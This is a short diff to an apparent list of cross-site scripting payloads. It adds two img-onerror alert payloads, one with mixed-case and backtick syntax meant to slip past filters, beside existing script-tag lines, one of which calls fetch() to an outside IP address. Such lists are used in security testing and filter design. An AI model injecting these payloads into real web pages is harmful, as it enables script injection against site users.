@@ -10,6 +10,14 @@
 <script>alert(xiaofeixia)</script>
 ```
 
+```html
+<img src=1 onerror=alert(233)>
+```
+
+```html
+<img src=1 oNeRrOr=alert`233`>
+```
+
 ```javascript
 <script>fetch('http://10.11.72.22/');</script>
 ```
